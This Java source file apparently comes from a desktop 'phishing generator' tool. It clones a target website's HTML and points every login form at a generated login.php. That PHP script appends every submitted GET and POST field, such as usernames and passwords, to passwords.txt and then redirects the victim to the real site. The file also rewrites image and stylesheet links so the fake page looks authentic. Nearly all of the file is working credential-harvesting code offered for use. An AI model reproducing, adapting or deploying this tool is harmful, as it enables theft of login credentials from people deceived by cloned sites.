package webtool;


import java.io.*;
import java.awt.event.*;
import javax.swing.*;
import java.net.*;
import org.jsoup.*;
import org.jsoup.nodes.*;
import org.jsoup.select.Elements;


/**
 * 
 * create phishing file of given url
 */
public class  phishing_back {
    JButton openButton;
    JButton download;
    JTextField log;
    JFileChooser fc;
    JPanel panel;
    String address;
    String htmlFile;
    JTextField targ;
    StringBuilder builder;

    public phishing_back()
    {
        download= Phishing_Gui.jb2;
        log = Phishing_Gui.target;
        openButton=Phishing_Gui.jb1;
        panel=Phishing_Gui.panel1;
        targ=Phishing_Gui.target1;
      
        //Create a file chooser to select the location to save the data
        fc = new JFileChooser();
        fc.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY); //selects folders only

        // adding action listner to save location button 
        openButton.addActionListener(new ActionListener()
        {
            public void actionPerformed(ActionEvent e)
            {
                int returnVal = fc.showOpenDialog(panel);
                if (returnVal == JFileChooser.APPROVE_OPTION) 
                {
                    //saving address
                    address = fc.getSelectedFile().getAbsolutePath(); 
                    targ.setText(address);
                }
            }
        });
        
        //downloading whole site
        download.addActionListener(new ActionListener()
        {
                public void actionPerformed(ActionEvent e)
                {
                    String targetSite=log.getText();
                    int checkpoint=0;
                    int flag=0;
                    
                    //checking site header.  If it's wrong then correct it
                    if(targetSite.contains("http://" ))
                    {
                        flag=1;
                    }
                    if(targetSite.contains("https://" ))
                    {
                        flag=1;
                    }
                    if(flag==0){
                        try
                        {
                                targetSite= adminFinder.httpSite(targetSite);
                        }
                        catch(IOException exx){
                            checkpoint=1;
                        }
                    }
                   if(checkpoint==0){
                      try {
                        //Reading whole html file in a string
                        URL url = new URL(targetSite);
                        
                        //setting the url connection
                        URLConnection urlc = url.openConnection();
                        BufferedInputStream buffer = new BufferedInputStream(urlc.getInputStream());
                        builder = new StringBuilder();
                        int byteRead;
                       
                        //reading site content
                        while ((byteRead = buffer.read()) != -1)
                        {
                            builder.append((char) byteRead);
                        }
                        buffer.close();
                        htmlFile=builder.toString();
                        address=address.replaceAll("\\\\", "/");
                        address += "/Phishing-Files"; 
            
                        /**
                         * creating phishing-Files folder
                         * which contain all phishing files
                         */ 
                        File f=new File(address); 
                        if(f.isDirectory())
                        {
                            //delete foloder if already exist 
                            deleteFolder(f);
                        }
            
                        //makes phising file directory
                        boolean first=new File(address).mkdir();
                        if(!first){
                              System.out.println("folder not made");
                    }
            
                    String index_php = address + "/index.php";
                    String passwords_txt = address + "/passwords.txt";
                    String login_php = address + "/login.php";
            
                    BufferedWriter br;
           
                    //creataing passwords.txt to save passwords 
                    br= new BufferedWriter(new FileWriter(passwords_txt));
                    br.write("Find user id and passwords : \n");
                    br.close();
            
                    //<--- Creating login.php --->
                    br= new BufferedWriter(new FileWriter(login_php));
                    br.write("<?php\n" + "header(\"Location:" + targetSite + "\");");
                    br.write("$handle = fopen(\"passwords.txt\",\"a\");");
                    
                    //using get method
                    br.write("foreach($_GET as $variable => $value)");
                    br.write("{\n" + " fwrite($handle, $variable);");
                    br.write("fwrite($handle, \"=\");");
                    br.write("fwrite($handle, $value);");
                    br.write("fwrite($handle, \"\\r\\n\");\n"  + "}");
                    
                    //using post method
                    br.write("foreach($_POST as $variable => $value)");
                    br.write("{\n" + " fwrite($handle, $variable);");
                    br.write("fwrite($handle, \"=\");");
                    br.write("fwrite($handle, $value);");
                    br.write("fwrite($handle, \"\\r\\n\");\n"  + "}");
                    br.write("fwrite($handle, \"\\r\\n\");");
                    br.write("fclose($handle);");
                    br.write("exit; " + "?>");
                    br.close();
           
                   //changing value of action attribute
                   Document doc = Jsoup.connect(targetSite).get();
                   Elements links = doc.getElementsByTag("form");
                   for (Element link : links) 
                   {
                        String linkHref = link.attr("action");
                         htmlFile = htmlFile.replace(linkHref, "./login.php");
                    }
            
                    links = doc.getElementsByTag("img");
                    
                    //changing img tag source loction
                    for (Element link : links) {
                        String linkHref = link.attr("src");
                         if(!(linkHref.contains("http://") || linkHref.contains("https://")))
                         {
                             String stt= targetSite + "/"+ linkHref;
                            htmlFile = htmlFile.replace(linkHref, stt);
                     
                          }
                    }
            
                    //changing value of href of link tag s
                     links = doc.getElementsByTag("link");
                     for (Element link : links)
                     {
                          String linkHref = link.attr("href");
                          if(!(linkHref.contains("http://") || linkHref.contains("https://")))
                           {
                                if(linkHref.substring(0, 1)=="/" || linkHref.substring(0, 3)=="../"){
                                    String stt= targetSite + linkHref;
                                    htmlFile = htmlFile.replace(linkHref, stt);
                                }
                                else{
                                    String stt= targetSite + "/"+linkHref;
                                    htmlFile = htmlFile.replace(linkHref, stt);
                                }
                            }
                    }
            
                  //saving modified page as HTML Form...
                  br= new BufferedWriter(new FileWriter(index_php)); 
                  br.write(htmlFile);
                  br.close();
                  //show dialog after downloading
                  JOptionPane.showMessageDialog( Phishing_Gui.jp1,"Successfully Downloaded !!!","Phishing Generator",JOptionPane.NO_OPTION);  
            } catch (MalformedURLException ex) {
                ex.printStackTrace();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
         }
        else{
            JOptionPane.showMessageDialog( Phishing_Gui.jp1,"Enter correct URL","Phishing Generator",JOptionPane.NO_OPTION); 
        }
          }
        });
                
    }
    
    //deleter specified folder
    public static void deleteFolder(File folder) {
    File[] files = folder.listFiles();
    if(files!=null) { 
        for(File f: files) {
            if(f.isDirectory()) {
                deleteFolder(f);
            } else {
                f.delete();
            }
        }
    }
    folder.delete();
  }
}